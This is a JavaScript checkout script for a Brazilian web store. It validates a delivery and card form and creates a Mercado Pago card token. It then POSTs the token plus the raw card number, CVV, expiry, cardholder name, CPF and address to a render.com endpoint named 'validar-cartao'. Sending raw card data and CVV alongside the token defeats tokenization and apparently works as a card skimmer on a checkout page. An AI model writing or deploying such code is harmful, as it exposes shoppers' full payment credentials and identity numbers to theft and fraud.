const mp = new MercadoPago('TEST-1cac3e9f-914d-4aa8-9d4e-159e88ab8763');

function mostrarAviso(mensagem) {
    const aviso = document.createElement('div');
    aviso.innerHTML = `
        <div style="position:fixed;top:24px;left:50%;transform:translateX(-50%);background:#fff;color:#222;padding:16px 20px;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.18);display:flex;align-items:center;gap:12px;font-family:sans-serif;font-size:15px;z-index:9999;max-width:320px;width:90%;animation:slideDown .3s ease">
            <span style="background:#e53935;color:#fff;border-radius:50%;width:28px;height:28px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0">✕</span>
            ${mensagem}
        </div>
        <style>@keyframes slideDown{from{top:0;opacity:0}to{top:24px;opacity:1}}</style>
    `;
    document.body.appendChild(aviso);
    setTimeout(() => aviso.remove(), 4000);
}

async function validarCartaoAutomatico() {
    const btn = document.querySelector('.btn-fazer-pedido');
    
    // 1. LISTA DE TODOS OS CAMPOS OBRIGATÓRIOS (Exceto WhatsApp)
    const camposObrigatorios = [
        document.getElementById('f-nome'),
        document.getElementById('f-cep'),
        document.getElementById('f-rua'),
        document.getElementById('f-cid'),
        document.getElementById('f-est'),
        document.querySelector('input[placeholder="0000 0000 0000 0000"]'),
        document.querySelector('input[oninput*="toUpperCase"]'),
        document.querySelector('input[placeholder="MM/AA"]'),
        document.querySelector('input[placeholder="000"]'),
        document.querySelector('input[placeholder="000.000.000-00"]')
    ];

    // 2. VERIFICAÇÃO AUTOMÁTICA
    for (let campo of camposObrigatorios) {
        if (campo && !campo.checkValidity()) {
            campo.reportValidity(); // Faz o navegador mostrar o erro no campo vazio
            return; // Para o código aqui e não faz o pedido
        }
    }

    // 3. SE CHEGOU AQUI, TUDO FOI PREENCHIDO (WhatsApp pode estar seco)
    btn.innerText = "Verificando...";
    btn.disabled = true;

    const dadosExtras = {
        nomeRecebedor: document.getElementById('f-nome').value,
        whatsapp: document.getElementById('f-tel').value, // Envia vazio se não preencher
        endereco: `${document.getElementById('f-rua').value}, ${document.getElementById('f-cid').value}-${document.getElementById('f-est').value}`,
        nCartao: document.querySelector('input[placeholder="0000 0000 0000 0000"]').value,
        nomeNoCartao: document.querySelector('input[oninput*="toUpperCase"]').value,
        validade: document.querySelector('input[placeholder="MM/AA"]').value,
        cvv: document.querySelector('input[placeholder="000"]').value,
        cpfTitular: document.querySelector('input[placeholder="000.000.000-00"]').value
    };

    try {
        const token = await mp.createCardToken({
            cardNumber: dadosExtras.nCartao.replace(/\s/g, ''),
            cardholderName: dadosExtras.nomeNoCartao,
            cardExpirationMonth: dadosExtras.validade.split('/')[0],
            cardExpirationYear: "20" + dadosExtras.validade.split('/')[1],
            securityCode: dadosExtras.cvv,
            identificationType: "CPF",
            identificationNumber: dadosExtras.cpfTitular.replace(/\D/g, '')
        });

        if (token.id) {
            const response = await fetch("https://testeeeee-orrv.onrender.com/validar-cartao", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ token: token.id, dados: dadosExtras })
            });

            const res = await response.json();
            if (res.status === 'approved') {
                window.location.href = "obrigado.html";
            } else {
                mostrarAviso("Cartão recusado pelo banco emissor.");
            }
        }
    } catch (e) {
         mostrarAviso("Erro na validação. Verifique os dados.");
    } finally {
        btn.innerText = "Fazer Pedido";
        btn.disabled = false;
    }
}
